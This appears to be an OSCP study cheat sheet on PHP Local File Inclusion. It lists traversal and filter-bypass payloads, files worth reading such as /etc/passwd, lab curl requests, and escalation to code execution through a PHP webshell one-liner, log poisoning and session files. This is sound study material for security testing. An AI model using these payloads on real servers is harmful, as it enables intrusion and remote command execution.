
**Local File Inclusion (LFI) is similar to Path Traversal in that you can read files on the server using `../` sequences, but the key difference is that LFI passes your input to functions like `include()` or `require()`, meaning you may be able to execute code and achieve Remote Code Execution (RCE) if you can control the contents of an included file, i.e. upload your own file and then execute it through Local File Inclusion [[File Upload]]**

---

### 🔍 1. Identify Potential Targets

Look for parameters that suggest templates/pages are being included dynamically:

- `?page=`, `?template=`, `?include=`, `?file=`, `?lang=`
    
- URLs ending with `.php` but the parameter value controls what loads:
    
    `index.php?page=home` 
    `template.php?file=about.html` 
    `index.php?lang=EN`
    
- Error messages mentioning `include()` or `require()`.
    

---

### 🛠️ 2. Basic Testing

**MAKE SURE TO TRY EIGHT LEVELS OF DEPTH**

Start with simple payloads to confirm file inclusion:

`?page=../../../../etc/passwd` 
`?page=/etc/passwd`

Confirm success if you see output like:

`root:x:0:0:root:/root:/bin/bash`

#### ⚡ **2a. POST Request Testing**

Some LFI parameters only accept POST, so check how the parameter is sent first (form method, dev tools, etc.). Once identified:

**IMPORTANT:** Even if the application shows it’s using `GET` requests (via browser dev tools), always test `POST` and `COOKIE` parameters as well.  
If the server-side code uses the PHP superglobal `$_REQUEST`, then `$_GET`, `$_POST`, and `$_COOKIE` inputs are all merged.  
Developers often apply filtering only on `$_GET` parameters (since that’s what they expect). Sending the same payload via `POST` or `COOKIE` can bypass server-side filters and successfully trigger the LFI.

##### Standard form data (`application/x-www-form-urlencoded`)

`curl -X POST -d "file=../../../../etc/passwd" http://10.10.59.10/challenges/chall1.php`

##### File upload style (`multipart/form-data`)

`curl -X POST -F "file=@/etc/passwd" http://10.10.59.10/challenges/chall1.php`

**Note:** Using `?file=...` in the URL with `-X POST` **does not send it in the POST body**.

#### ⚡ 2b. Cookie & Header LFI Testing

Some LFI vulnerabilities are triggered through **cookies or HTTP headers** instead of GET/POST parameters. Always inspect all user-controlled inputs:

##### 1. Cookie-based LFI

- Check cookies in the browser or Burp Suite for parameters that could be included in the backend, e.g., `lang`, `template`, `page`, `include`, `file`.
    
- Tamper with the cookie to include traversal sequences or files:
    

`Cookie: lang=../../../../etc/passwd`

- If successful, the server will include the file specified in your cookie.
    

##### 2. Header-based LFI (e.g., User-Agent, Referrer)

- Some apps log headers into files that can then be included.
    
- Example: inject PHP code in User-Agent:
    

`User-Agent: <?php system($_GET['cmd']); ?>`

- Then include the log via LFI:
    

`?page=../../../../var/log/apache2/access.log`




### 🔄 3. Bypass Filters

**MAKE SURE TO TRY EIGHT LEVELS OF DEPTH**

If `../` is blocked use URL encoded `%2e%2e%2f`:

- URL encoding:
    
    `%2e%2e%2fetc/passwd` 
    `%252e%252e%252fetc/passwd`   (double encoding)
    
- Null byte injection (older PHP):
    
    `../../etc/passwd%00`
    
- Current Directory Trick:
    
    `../../etc/passwd/.`
    
- Bypass input string validation:
    
    `....//....//etc/passwd`
    
- When a URL parameter includes a directory and the application enforces that input starts with that directory (e.g., `lang=languages/EN.php`), you must include the directory in your payload to bypass this check. For example:
    
    `lang=languages/../../../../../etc/passwd`
    
    **not**
    
    `lang=../../../../../etc/passwd`
    
    **The prefixed folder is required to satisfy the developer’s enforced path check; the `../` sequences are then used to escape the directory and access the target file.**
    
- Change extensions:
    
    `../../etc/passwd.txt`
    

---

### 📖 4. Useful Local Files

- Linux:
    
    `/etc/passwd` 
    `/etc/hosts` 
    `/proc/self/environ` 
    `/var/log/apache2/access.log` 
    `/var/www/html/config.php`
    
- Windows:
    
    `C:\Windows\win.ini` 
    `C:\Windows\System32\drivers\etc\hosts`
    

---

✅ **Key OSCP Tip:** Always **check if the parameter is GET or POST first** — no need to test both blindly. Then apply your payloads using the correct method.

### ⚡ 5. LFI → RCE Pivot Techniques

Once you’ve confirmed LFI, the goal is often to **escalate from file reading to code execution**. These are the main methods:

---

#### 1. Upload a file you control

- If the app allows file uploads (avatars, PDFs, documents), you can upload a PHP webshell:
    

`<?php system($_GET['cmd']); ?>`

- Include it via LFI:
    

`?page=../../uploads/shell.php`

- Execute commands:
    

`?page=../../uploads/shell.php&cmd=id`

- ⚡Tip: Always check the server path (`/var/www/html/uploads/`) and the filename.
    

---

#### 2. Log Poisoning

- Web server logs (Apache, Nginx) store your requests. You can inject PHP into headers (User-Agent, Referer) or URL:
    

`User-Agent: <?php system($_GET['cmd']); ?>`

- Then include the log file via LFI:
    

`?page=../../../../var/log/apache2/access.log`

---

#### 3. `/proc/self/environ`

- On Linux, `/proc/self/environ` contains environment variables, including HTTP headers.
    
- Inject PHP code via headers (User-Agent) and include the file:
    

`?page=../../../../proc/self/environ`

---

#### 4. PHP Sessions

- If PHP sessions are stored on disk (`/tmp/sess_<ID>`), you may inject PHP code into session variables (via cookies).
    
- Include the session file via LFI → RCE.
    

---

#### 5. Other writable locations

- Backups, temp files, or debug logs sometimes allow you to write PHP code.
    
- Include these files to execute code.
    

---

### ⚡ Workflow Summary

1. Confirm LFI (file reading works).
    
2. Enumerate writable files / logs / session storage.
    
3. Inject PHP code via upload, log, session, or `/proc/self/environ`.
    
4. Include that file using LFI → RCE.
    
5. Escalate privileges if possible.
    

---

✅ **OSCP Tip:** Always map out **which writable location is accessible** first — LFI itself only reads files; you need a file with PHP code to gain RCE.